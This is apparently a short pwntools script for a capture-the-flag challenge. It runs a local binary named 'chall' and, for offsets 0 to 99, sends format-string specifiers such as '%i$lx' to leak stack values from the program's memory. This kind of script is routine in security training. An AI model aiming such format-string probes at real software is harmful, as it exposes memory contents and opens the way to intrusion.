from pwn import *

elf = context.binary = ELF("./chall", checksec=False)

for i in range(100):
    try:
        p = process(level="error")
        p.sendlineafter(b"> ", f"%{i}$lx".encode())

        result = p.recvline().decode()
        if result:
            print(f"{i}: {result.strip()}")
        p.close()
    except EOFError:
        pass
